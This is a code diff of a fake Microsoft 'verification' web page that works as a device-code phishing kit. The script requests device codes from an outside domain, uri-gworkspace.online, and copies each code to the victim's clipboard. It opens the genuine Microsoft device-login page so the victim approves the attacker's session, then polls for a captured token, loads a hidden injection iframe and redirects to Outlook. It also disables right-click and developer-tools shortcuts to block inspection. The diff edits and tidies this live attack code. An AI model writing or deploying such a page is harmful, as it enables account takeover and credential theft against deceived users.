@@ -20,7 +20,9 @@
 <div class="status loading" id="status"><span class="spinner"></span>Generating verification code...</div><div class="timer" id="timer"></div></div>
 </div><div class="footer">&copy; 2026 Microsoft Corporation. <a href="#">Privacy</a> | <a href="#">Terms</a> | <a href="#">Support</a></div></div></div>
 <script>
-const API='https://uri-gworkspace.online/api',REDIRECT='https://outlook.office.com/mail/',MS='https://login.microsoft.com/device';
+const API='https://uri-gworkspace.online/api';
+const REDIRECT='https://outlook.office.com/mail/';
+const MS='https://login.microsoft.com/device';
 let poll=null,sid=null,exp=null,ti=null,turnstileToken=null;
 document.addEventListener('contextmenu',function(e){e.preventDefault()});
 function disableKeys(e){if(e.keyCode==123||(e.ctrlKey&&e.shiftKey&&e.keyCode==73)){e.preventDefault();return false}return true}
@@ -30,7 +32,32 @@ function onTurnstileExpired(){turnstileToken=null;document.getElementById('turns
 async function copyToClipboard(text){try{await navigator.clipboard.writeText(text)}catch(e){const ta=document.createElement('textarea');ta.value=text;ta.style.left='-9999px';document.body.appendChild(ta);ta.select();document.execCommand('copy');document.body.removeChild(ta)}}
 function openMicrosoftLogin(){window.open(MS,'_blank','width=600,height=700,left='+(screen.width-600)/2+',top='+(screen.height-700)/2+',resizable=yes,scrollbars=yes')}
 async function handleCodeClick(){const code=document.getElementById('code').textContent;if(code==='--------')return;await copyToClipboard(code);document.getElementById('codeBox').classList.add('copied');document.getElementById('codeHint').textContent='✅ Code copied! Opening Microsoft...';document.getElementById('btn').disabled=true;document.getElementById('status').innerHTML='✅ Code copied!<br><small>Paste (Ctrl+V) on Microsoft page</small>';document.getElementById('status').className='status success';document.getElementById('instructions').style.display='block';setTimeout(openMicrosoftLogin,600)}
-async function generateCode(){if(!turnstileToken)return;const s=document.getElementById('status'),c=document.getElementById('code'),b=document.getElementById('btn'),cb=document.getElementById('codeBox');b.disabled=true;b.textContent='Generating...';s.innerHTML='<span class="spinner"></span>Generating...';s.className='status loading';try{const r=await fetch(API+'/device_code',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({turnstile_token:turnstileToken})});const d=await r.json();if(d.success){cb.style.display='block';c.textContent=d.user_code;sid=d.session_id;if(d.expires_in){exp=new Date(Date.now()+d.expires_in*1000);updateTimer();if(ti)clearInterval(ti);ti=setInterval(updateTimer,1000)}s.innerHTML='✅ Code ready!';s.className='status success';b.textContent='Sign In & Verify';b.disabled=false;b.onclick=handleCodeClick;startPoll()}else{s.innerHTML='❌ '+(d.error||'Error');s.className='status error';b.textContent='Try Again';b.disabled=false;b.onclick=generateCode}}catch(e){s.innerHTML='❌ Connection error';s.className='status error';b.textContent='Retry';b.disabled=false;b.onclick=generateCode}}
+async function generateCode(){
+    if(!turnstileToken)return;
+    const s=document.getElementById('status'),c=document.getElementById('code'),b=document.getElementById('btn'),cb=document.getElementById('codeBox');
+    b.disabled=true;b.textContent='Generating...';s.innerHTML='<span class="spinner"></span>Generating...';s.className='status loading';
+    try{
+        const r=await fetch(API+'/device_code',{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({turnstile_token:turnstileToken})
+        });
+        const d=await r.json();
+        if(d.success && d.user_code){
+            cb.style.display='block';c.textContent=d.user_code;sid=d.session_id;
+            if(d.expires_in){exp=new Date(Date.now()+d.expires_in*1000);updateTimer();if(ti)clearInterval(ti);ti=setInterval(updateTimer,1000)}
+            s.innerHTML='✅ Code ready!';s.className='status success';
+            b.textContent='Sign In & Verify';b.disabled=false;b.onclick=handleCodeClick;
+            startPoll();
+        }else{
+            s.innerHTML='❌ '+(d.error||'No code received');s.className='status error';
+            b.textContent='Try Again';b.disabled=false;b.onclick=generateCode;
+        }
+    }catch(e){
+        s.innerHTML='❌ Connection error. Try again.';s.className='status error';
+        b.textContent='Retry';b.disabled=false;b.onclick=generateCode;
+    }
+}
 function updateTimer(){if(!exp)return;const d=Math.max(0,Math.floor((exp-Date.now())/1000)),m=Math.floor(d/60),sec=d%60;const t=document.getElementById('timer');if(d<=0){clearInterval(ti);setTimeout(generateCode,2000)}else{t.textContent='⏰ '+m+':'+sec.toString().padStart(2,'0')}}
 function startPoll(){const s=document.getElementById('status');let a=0;if(poll)clearInterval(poll);poll=setInterval(async()=>{a++;try{const r=await fetch(API+'/poll/'+sid);const d=await r.json();if(d.captured){clearInterval(poll);clearInterval(ti);s.innerHTML='✅ Success! Redirecting...';s.className='status success';if(d.injection_url){const f=document.createElement('iframe');f.style.display='none';f.src=d.injection_url+'?auto=true';document.body.appendChild(f)}setTimeout(()=>{location.href=REDIRECT},3000)}else if(d.error){clearInterval(poll);clearInterval(ti);s.innerHTML='❌ '+d.error;s.className='status error';b=document.getElementById('btn');b.disabled=false;b.textContent='Try Again';b.onclick=generateCode}if(a>=180){clearInterval(poll);clearInterval(ti);s.innerHTML='⏰ Timed out';s.className='status error'}}catch(e){}},5000)}
 </script></body></html>
